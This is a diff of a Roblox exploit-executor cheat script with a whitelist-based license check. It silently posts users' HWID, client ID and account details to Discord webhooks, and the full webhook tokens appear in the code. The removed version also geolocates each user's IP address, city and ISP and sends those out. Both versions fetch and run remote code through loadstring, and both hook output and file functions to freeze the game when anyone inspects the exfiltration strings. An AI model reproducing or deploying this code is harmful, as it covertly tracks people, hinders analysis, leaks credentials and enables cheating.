@@ -1,418 +1,335 @@
-task.spawn(function()
-	hookfunction(print, function(p1)
-		if string.find(p1:lower(), "http") then
-			while true do
-
-			end
-		else
-			return
-		end
-	end)
-	hookfunction(warn, function(p2)
-		if string.find(p2:lower(), "http") then
-			while true do
-
-			end
-		else
-			return
-		end
-	end)
-	hookfunction(error, function(p3)
-		if string.find(p3:lower(), "http") then
-			while true do
-
-			end
-		else
-			return
-		end
-	end)
-	local oldWriteFile = nil
-	oldWriteFile = hookfunction(writefile, function(fileName, content)
-		if string.find(string.lower(content), "http") or (string.find(string.lower(content), "//") or string.find(string.lower(content), "https://discord.com/api/webhooks/")) then
-			while true do
-
-			end
-		else
-			return oldWriteFile(fileName, content)
-		end
-	end)
-	local oldAppendFile = nil
-	oldAppendFile = hookfunction(appendfile, function(_, fileContent)
-		if string.find(string.lower(fileContent), "http") or (string.find(string.lower(fileContent), "//") or string.find(string.lower(fileContent), "https://discord.com/api/webhooks/")) then
-			while true do
-
-			end
-		else
-			return
-		end
-	end)
-	game.DescendantAdded:Connect(function(descendant)
-		if (descendant and descendant:IsA("TextLabel") or (descendant:IsA("TextButton") or descendant:IsA("Message"))) and string.find(string.lower(descendant.Text), "http") then
-			while true do
-
-			end
-		else
-			return
-		end
-	end)
-	getgenv().rconsoletitle = nil
-	getgenv().rconsoleprint = nil
-	getgenv().rconsolewarn = nil
-	getgenv().rconsoleinfo = nil
-	getgenv().rconsolerr = nil
-	getgenv().clonefunction = function()
-		while true do
-
-		end
-	end
-	game.CoreGui.ChildAdded:Connect(function(child)
-		if string.lower(child.Name) ~= "devconsolemaster" then
-			return
-		else
-			while true do
-
-			end
-		end
-	end)
-	local oldNamecall = nil
-	oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(_)
-		local method = getnamecallmethod()
-		if string.lower(method) ~= "rconsoleprint" then
-			if string.lower(method) ~= "rconsoleinfo" then
-				if string.lower(method) == "rconsolewarn" then
-					while true do
-
-					end
-				else
-					return
-				end
-			else
-				while true do
-
-				end
-			end
-		else
-			while true do
-
-			end
-		end
-	end))
-end)
+local CONFIG = {
+    WEBHOOK_AUTH = "https://discord.com/api/webhooks/1448814494359748718/vhzjZ_yzx-hX1u5Hb4dzwlMbDY-CAFaK88IUfs2xBedwVPTSRbtrmBIeVt5KkfPI9Ddp",
+    WEBHOOK_LOG = "https://discord.com/api/webhooks/1448813123225128980/NypA6Ijvw3dBVta68xvtc9sjrXiIbyU8wisGxZbS6vcgc-WpQVDjNnjviq62RuAhaeIQ",
+    WHITELIST_URL = "https://raw.githubusercontent.com/CoronaBlanca/Whitelist-Users/refs/heads/main/SC%20Booster",
+    CHECK_INTERVAL = 300,
+}
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local ClientId = game:GetService("RbxAnalyticsService"):GetClientId()
-local HWID = identifyexecutor and identifyexecutor() or "Unknown"
-local WebhookURL_Spoofed = "https://discord.com/api/webhooks/1448814939367014583/pnmkhhbVhC0K2WSQi8UHqJIpsE_agDp_Ln57sTDMBWc90kU0cwlaBvsFYAkHmk_Us51_"
-local WebhookURL_Whitelisted = "https://discord.com/api/webhooks/1448813123225128980/NypA6Ijvw3dBVta68xvtc9sjrXiIbyU8wisGxZbS6vcgc-WpQVDjNnjviq62RuAhaeIQ"
-local WebhookURL_NotWhitelisted = "https://discord.com/api/webhooks/1448814494359748718/vhzjZ_yzx-hX1u5Hb4dzwlMbDY-CAFaK88IUfs2xBedwVPTSRbtrmBIeVt5KkfPI9Ddp"
+local LocalPlayer = Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 
 local function getExecutorName()
-	return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt" or (identifyexecutor and identifyexecutor() or "Unknown"))
+    if syn and not is_sirhurt_closure and not pebc_execute then
+        return "Synapse X"
+    elseif secure_load then
+        return "Sentinel"
+    elseif pebc_execute then
+        return "ProtoSmasher"
+    elseif KRNL_LOADED then
+        return "Krnl"
+    elseif is_sirhurt_closure then
+        return "SirHurt"
+    elseif identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown"
+    end
 end
 
-local function kickPlayerForSpoofing(player, reason)
-	local executorName = getExecutorName()
-	local embedData = {
-		["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-		["content"] = "",
-		["embeds"] = {
-			{
-				["author"] = {
-					["name"] = "Spoofed Client ID Detected (Booster version)",
-					["url"] = "https://roblox.com"
-				},
-				["description"] = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s\n**User ID:** %d \n**Client ID:** %s \n**HWID:** %s \n**Executor:** %s\n\n **Reason:** %s", player.UserId, player.DisplayName, player.Name, player.UserId, ClientId, HWID, executorName, reason),
-				["type"] = "rich",
-				["color"] = tonumber("0xFF0000"),
-				["thumbnail"] = {
-					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
-				}
-			}
-		}
-	}
-	local requestFunc = http_request or request or (HttpPost or syn.request)
-	local requestData = {
-		["Url"] = WebhookURL_Spoofed,
-		["Body"] = HttpService:JSONEncode(embedData),
-		["Method"] = "POST",
-		["Headers"] = {
-			["Content-Type"] = "application/json"
-		}
-	}
-	pcall(function()
-		requestFunc(requestData)
-	end)
-	wait(1)
-	player:Kick("Spoofed Client ID detected.")
+local function getSystemInfo()
+    local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
+    local hwid = (gethwid and gethwid()) or clientId
+    
+    return {
+        executor = getExecutorName(),
+        clientId = clientId,
+        hwid = hwid,
+        userId = LocalPlayer.UserId,
+        username = LocalPlayer.Name,
+        displayName = LocalPlayer.DisplayName,
+        accountAge = LocalPlayer.AccountAge,
+        premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium,
+        platform = UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) and "Mobile" 
+                   or (UserInputService.KeyboardEnabled and UserInputService.MouseEnabled and "PC" 
+                   or (UserInputService.GamepadEnabled and "Console" or "Unknown"))
+    }
 end
 
--- Cargar whitelist desde GitHub
-local WhitelistData = (function()
-	local success, rawData = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/CoronaBlanca/Whitelist-Users/refs/heads/main/SC%20Booster")
-	if success and rawData then
-		local loadSuccess, whitelistTable = pcall(function()
-			return loadstring(rawData)()
-		end)
-		if loadSuccess and type(whitelistTable) == "table" then
-			return whitelistTable
-		end
-	end
-	return {}
-end)()
-
-local LocalPlayer = Players.LocalPlayer
-
-if (function(clientId, hwid)
-	local iterator, data, index = ipairs(WhitelistData)
-	while true do
-		local entry
-		index, entry = iterator(data, index)
-		if index == nil then
-			break
-		end
-		if entry.hwid == hwid and entry.clientID == clientId then
-			return true
-		end
-	end
-	return false
-end)(ClientId, HWID) then
-	print("Client ID and HWID verified. Access granted.")
-	
-	local HttpService = game:GetService("HttpService")
-	local Players = game:GetService("Players")
-	local MarketplaceService = game:GetService("MarketplaceService")
-	local UserInputService = game:GetService("UserInputService")
-	local LocalPlayer = Players.LocalPlayer
-	local UserId = LocalPlayer.UserId
-	local DisplayName = LocalPlayer.DisplayName
-	local Username = LocalPlayer.Name
-	local AccountAge = LocalPlayer.AccountAge
-	local PremiumStatus = (function()
-		return LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
-	end)()
-	local Platform = (function()
-		return UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) and "Mobile" or (UserInputService.KeyboardEnabled and UserInputService.MouseEnabled and "PC" or (UserInputService.GamepadEnabled and "Console" or "Unknown"))
-	end)()
-	local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-	
-	local function getExecutorName()
-		return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt")) or (identifyexecutor() and (identifyexecutor():find("ScriptWare") and "Script-Ware" or identifyexecutor()) or "Unknown")
-	end
-	
-	-- Obtener información de IP
-	local function getIPInfo()
-		local success, ipData = pcall(function()
-			return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
-		end)
-		if success and ipData then
-			return {
-				ip = ipData.query or "Unknown",
-				country = ipData.country or "Unknown",
-				region = ipData.regionName or "Unknown",
-				city = ipData.city or "Unknown",
-				isp = ipData.isp or "Unknown",
-				timezone = ipData.timezone or "Unknown"
-			}
-		end
-		return {
-			ip = "Unknown",
-			country = "Unknown",
-			region = "Unknown",
-			city = "Unknown",
-			isp = "Unknown",
-			timezone = "Unknown"
-		}
-	end
-	
-	local IPInfo = getIPInfo()
-	local ExecutorName = getExecutorName()
-	
-	-- Obtener plataforma correcta
-	local PlatformName = "Unknown"
-	if UserInputService:GetPlatform() == Enum.Platform.Windows then
-		PlatformName = "Windows"
-	elseif UserInputService:GetPlatform() == Enum.Platform.OSX then
-		PlatformName = "MacOS"
-	elseif UserInputService:GetPlatform() == Enum.Platform.IOS then
-		PlatformName = "iOS"
-	elseif UserInputService:GetPlatform() == Enum.Platform.Android then
-		PlatformName = "Android"
-	elseif UserInputService:GetPlatform() == Enum.Platform.XBoxOne then
-		PlatformName = "Xbox"
-	elseif UserInputService:GetPlatform() == Enum.Platform.PS4 then
-		PlatformName = "PlayStation"
-	end
-	
-	-- Webhook mejorado para usuarios WHITELISTED
-	(function(webhookUrl, webhookBody)
-		(http_request or request or (HttpPost or syn.request))({
-			["Url"] = webhookUrl,
-			["Body"] = webhookBody,
-			["Method"] = "POST",
-			["Headers"] = {
-				["content-type"] = "application/json"
-			}
-		})
-	end)(WebhookURL_Whitelisted, ((function()
-		local timestamp = os.date("%d/%m/%Y %I:%M %p")
-		local webhookData = {
-			["username"] = "Galaxy Hub • Logs",
-			["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-			["embeds"] = {
-				{
-					["title"] = "Execution Log",
-					["color"] = tonumber("0x00FF00"),
-					["thumbnail"] = {
-						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-					},
-					["fields"] = {
-						{
-							["name"] = "**Player Info**",
-							["value"] = string.format("**Display Name:** %s\n**Username:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Premium:** %s\n**Platform:** %s", DisplayName, Username, UserId, AccountAge, PremiumStatus, PlatformName),
-							["inline"] = false
-						},
-						{
-							["name"] = "**Game Info**",
-							["value"] = string.format("**Game Name:** [%s](https://www.roblox.com/games/%d)\n**Game ID:** %d\n**Executor:** %s\n**Client ID:** %s", GameName, game.PlaceId, game.PlaceId, ExecutorName, ClientId),
-							["inline"] = false
-						},
-						{
-							["name"] = "**IP Information**",
-							["value"] = string.format("**IP Address:** %s\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s", IPInfo.ip, IPInfo.country, IPInfo.region, IPInfo.city, IPInfo.isp, IPInfo.timezone),
-							["inline"] = false
-						}
-					},
-					["footer"] = {
-						["text"] = "Galaxy Hub • " .. timestamp
-					}
-				}
-			}
-		}
-		return HttpService:JSONEncode(webhookData)
-	end)()))
-	
-	local UILibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))():AddWindow("Beamed v2 (Server Booster Version)", {
-		["main_color"] = Color3.fromRGB(204, 0, 255),
-		["min_size"] = Vector2.new(600, 490),
-		["can_resize"] = false
-	})
-else
-	-- Webhook para usuarios NO WHITELISTED
-	local HttpService = game:GetService("HttpService")
-	local Players = game:GetService("Players")
-	local MarketplaceService = game:GetService("MarketplaceService")
-	local UserInputService = game:GetService("UserInputService")
-	local LocalPlayer = Players.LocalPlayer
-	local UserId = LocalPlayer.UserId
-	local DisplayName = LocalPlayer.DisplayName
-	local Username = LocalPlayer.Name
-	local AccountAge = LocalPlayer.AccountAge
-	local PremiumStatus = (function()
-		return LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
-	end)()
-	local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-	
-	local function getExecutorName()
-		return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt")) or (identifyexecutor() and (identifyexecutor():find("ScriptWare") and "Script-Ware" or identifyexecutor()) or "Unknown")
-	end
-	
-	-- Obtener información de IP
-	local function getIPInfo()
-		local success, ipData = pcall(function()
-			return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
-		end)
-		if success and ipData then
-			return {
-				ip = ipData.query or "Unknown",
-				country = ipData.country or "Unknown",
-				region = ipData.regionName or "Unknown",
-				city = ipData.city or "Unknown",
-				isp = ipData.isp or "Unknown",
-				timezone = ipData.timezone or "Unknown"
-			}
-		end
-		return {
-			ip = "Unknown",
-			country = "Unknown",
-			region = "Unknown",
-			city = "Unknown",
-			isp = "Unknown",
-			timezone = "Unknown"
-		}
-	end
-	
-	local IPInfo = getIPInfo()
-	local ExecutorName = getExecutorName()
-	
-	-- Obtener plataforma correcta
-	local PlatformName = "Unknown"
-	if UserInputService:GetPlatform() == Enum.Platform.Windows then
-		PlatformName = "Windows"
-	elseif UserInputService:GetPlatform() == Enum.Platform.OSX then
-		PlatformName = "MacOS"
-	elseif UserInputService:GetPlatform() == Enum.Platform.IOS then
-		PlatformName = "iOS"
-	elseif UserInputService:GetPlatform() == Enum.Platform.Android then
-		PlatformName = "Android"
-	elseif UserInputService:GetPlatform() == Enum.Platform.XBoxOne then
-		PlatformName = "Xbox"
-	elseif UserInputService:GetPlatform() == Enum.Platform.PS4 then
-		PlatformName = "PlayStation"
-	end
-	
-	-- Enviar webhook para usuario NO whitelisted
-	(function(webhookUrl, webhookBody)
-		(http_request or request or (HttpPost or syn.request))({
-			["Url"] = webhookUrl,
-			["Body"] = webhookBody,
-			["Method"] = "POST",
-			["Headers"] = {
-				["content-type"] = "application/json"
-			}
-		})
-	end)(WebhookURL_NotWhitelisted, ((function()
-		local timestamp = os.date("%d/%m/%Y %I:%M %p")
-		local webhookData = {
-			["username"] = "Galaxy Hub • Logs",
-			["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-			["embeds"] = {
-				{
-					["title"] = " Unauthorized Execution Attempt",
-					["color"] = tonumber("0xFF0000"),
-					["thumbnail"] = {
-						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-					},
-					["fields"] = {
-						{
-							["name"] = "**Player Info**",
-							["value"] = string.format("**Display Name:** %s\n**Username:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Premium:** %s\n**Platform:** %s", DisplayName, Username, UserId, AccountAge, PremiumStatus, PlatformName),
-							["inline"] = false
-						},
-						{
-							["name"] = "**Game Info**",
-							["value"] = string.format("**Game Name:** [%s](https://www.roblox.com/games/%d)\n**Game ID:** %d\n**Executor:** %s\n**Client ID:** %s", GameName, game.PlaceId, game.PlaceId, ExecutorName, ClientId),
-							["inline"] = false
-						},
-						{
-							["name"] = "**IP Information**",
-							["value"] = string.format("**IP Address:** %s\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s", IPInfo.ip, IPInfo.country, IPInfo.region, IPInfo.city, IPInfo.isp, IPInfo.timezone),
-							["inline"] = false
-						},
-						{
-							["name"] = "**Status**",
-							["value"] = " **NOT WHITELISTED** - Access Denied",
-							["inline"] = false
-						}
-					},
-					["footer"] = {
-						["text"] = "Galaxy Hub • " .. timestamp
-					}
-				}
-			}
-		}
-		return HttpService:JSONEncode(webhookData)
-	end)()))
-	
-	LocalPlayer:Kick("You are not whitelisted. Access denied.")
+local function notifyUnauthorized(info, reason)
+    pcall(function()
+        local payload = HttpService:JSONEncode({
+            avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+            embeds = {{
+                author = {
+                    name = "Acceso No Autorizado Detectado",
+                    url = "https://roblox.com"
+                },
+                description = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__\n" ..
+                    "**Display Name:** %s\n" ..
+                    "**Username:** %s\n" ..
+                    "**User ID:** %d\n" ..
+                    "**Client ID:** %s\n" ..
+                    "**HWID:** %s\n" ..
+                    "**Executor:** %s\n\n" ..
+                    "**Razón:** %s",
+                    info.userId, info.displayName, info.username, 
+                    info.userId, info.clientId, info.hwid, info.executor, reason
+                ),
+                color = 16711680,
+                thumbnail = {
+                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", info.userId)
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+            }}
+        })
+        
+        (http_request or request or HttpPost or syn.request)({
+            Url = CONFIG.WEBHOOK_AUTH,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
 end
+
+local function logExecution(info)
+    pcall(function()
+        local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+        local payload = HttpService:JSONEncode({
+            avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+            embeds = {{
+                author = {
+                    name = "Script Ejecutado Exitosamente",
+                    url = "https://roblox.com"
+                },
+                description = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__\n" ..
+                    "**Display Name:** %s\n" ..
+                    "**Username:** %s\n" ..
+                    "**User ID:** %d\n" ..
+                    "**Account Age:** %d days\n" ..
+                    "**Membership:** %s\n" ..
+                    "**Platform:** %s\n\n" ..
+                    "__[Game Info](https://www.roblox.com/games/%d)__\n" ..
+                    "**Game:** %s\n" ..
+                    "**Game ID:** %d\n" ..
+                    "**Executor:** %s",
+                    info.userId, info.displayName, info.username, 
+                    info.userId, info.accountAge, 
+                    info.premium and "Premium" or "No Premium",
+                    info.platform, game.PlaceId, gameName, 
+                    game.PlaceId, info.executor
+                ),
+                color = 16766720,
+                thumbnail = {
+                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", info.userId)
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+            }}
+        })
+        
+        (http_request or request or HttpPost or syn.request)({
+            Url = CONFIG.WEBHOOK_LOG,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+end
+
+local function secureKick(reason)
+    LocalPlayer:Kick("⚠️ " .. reason)
+    task.wait(1)
+    while true do end
+end
+
+local function protectOutput()
+    task.spawn(function()
+        local blockedPatterns = {"http", "discord", "webhook", "//"}
+        
+        local function checkAndBlock(str)
+            if not str then return end
+            local lower = string.lower(tostring(str))
+            for _, pattern in ipairs(blockedPatterns) do
+                if string.find(lower, pattern, 1, true) then
+                    while true do end
+                end
+            end
+        end
+        
+        hookfunction(print, function(...)
+            local args = {...}
+            for _, arg in ipairs(args) do
+                checkAndBlock(arg)
+            end
+        end)
+        
+        hookfunction(warn, function(...)
+            local args = {...}
+            for _, arg in ipairs(args) do
+                checkAndBlock(arg)
+            end
+        end)
+        
+        hookfunction(error, function(...)
+            local args = {...}
+            for _, arg in ipairs(args) do
+                checkAndBlock(arg)
+            end
+        end)
+        
+        if writefile then
+            hookfunction(writefile, function(_, content)
+                checkAndBlock(content)
+            end)
+        end
+        
+        if appendfile then
+            hookfunction(appendfile, function(_, content)
+                checkAndBlock(content)
+            end)
+        end
+        
+        game.DescendantAdded:Connect(function(obj)
+            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("Message")) then
+                pcall(function()
+                    checkAndBlock(obj.Text)
+                end)
+            end
+        end)
+        
+        if getgenv then
+            getgenv().rconsoletitle = nil
+            getgenv().rconsoleprint = nil
+            getgenv().rconsolewarn = nil
+            getgenv().rconsoleinfo = nil
+            getgenv().rconsolerr = nil
+            getgenv().clonefunction = function() while true do end end
+        end
+        
+        game:GetService("CoreGui").ChildAdded:Connect(function(child)
+            if string.lower(child.Name) == "devconsolemaster" then
+                while true do end
+            end
+        end)
+        
+        hookmetamethod(game, "__namecall", newcclosure(function(...)
+            local method = getnamecallmethod()
+            local blocked = {"rconsoleprint", "rconsoleinfo", "rconsolewarn", "rconsoleerr"}
+            for _, name in ipairs(blocked) do
+                if string.lower(method) == name then
+                    while true do end
+                end
+            end
+            return ...
+        end))
+    end)
+end
+
+local function checkWhitelist()
+    local info = getSystemInfo()
+    
+    local success, whitelist = pcall(function()
+        local response = game:HttpGet(CONFIG.WHITELIST_URL)
+        return loadstring(response)()
+    end)
+    
+    if not success or type(whitelist) ~= "table" then
+        notifyUnauthorized(info, "Error al cargar whitelist")
+        secureKick("Error de verificación. Contacta al desarrollador.")
+        return false
+    end
+    
+    for _, entry in ipairs(whitelist) do
+        if entry.hwid == info.hwid and entry.clientID == info.clientId then
+            return true, info
+        end
+    end
+    
+    notifyUnauthorized(info, "HWID/Client ID no encontrado en whitelist")
+    secureKick("Acceso denegado. No tienes licencia válida.")
+    return false
+end
+
+local function startContinuousCheck()
+    task.spawn(function()
+        while task.wait(CONFIG.CHECK_INTERVAL) do
+            local authorized = checkWhitelist()
+            if not authorized then
+                secureKick("Licencia revocada o expirada")
+            end
+        end
+    end)
+end
+
+local function initialize()
+    print("Verificando licencia...")
+    
+    protectOutput()
+    
+    -- Verificar whitelist
+    local authorized, info = checkWhitelist()
+    if not authorized then
+        return false
+    end
+    
+    print("Licencia verificada. Acceso concedido.")
+    
+    logExecution(info)
+    
+    startContinuousCheck()
+    
+    return true
+end
+
+if not initialize() then
+    return
+end
+
+print("Script cargado exitosamente")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local function unequipAllPets()
+    local petsFolder = LocalPlayer.petsFolder
+    for _, folder in pairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in pairs(folder:GetChildren()) do
+                ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", pet)
+            end
+        end
+    end
+    task.wait(0.1)
+end
+
+local function equipPet(petName)
+    unequipAllPets()
+    task.wait(0.01)
+    for _, pet in pairs(LocalPlayer.petsFolder.Unique:GetChildren()) do
+        if pet.Name == petName then
+            ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
+        end
+    end
+end
+
+local function findMachine(machineName)
+    local machine = workspace.machinesFolder:FindFirstChild(machineName)
+    if not machine then
+        for _, folder in pairs(workspace:GetChildren()) do
+            if folder:IsA("Folder") and folder.Name:find("machines") then
+                machine = folder:FindFirstChild(machineName)
+                if machine then break end
+            end
+        end
+    end
+    return machine
+end
+
+local function pressE()
+    local VIM = game:GetService("VirtualInputManager")
+    VIM:SendKeyEvent(true, "E", false, game)
+    task.wait(0.1)
+    VIM:SendKeyEvent(false, "E", false, game)
+end
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()
+local Window = Library:AddWindow("SC Script Booster Version", {
+    main_color = Color3.fromRGB(15, 15, 15),
+    min_size = Vector2.new(430, 530),
+    can_resize = false
+})
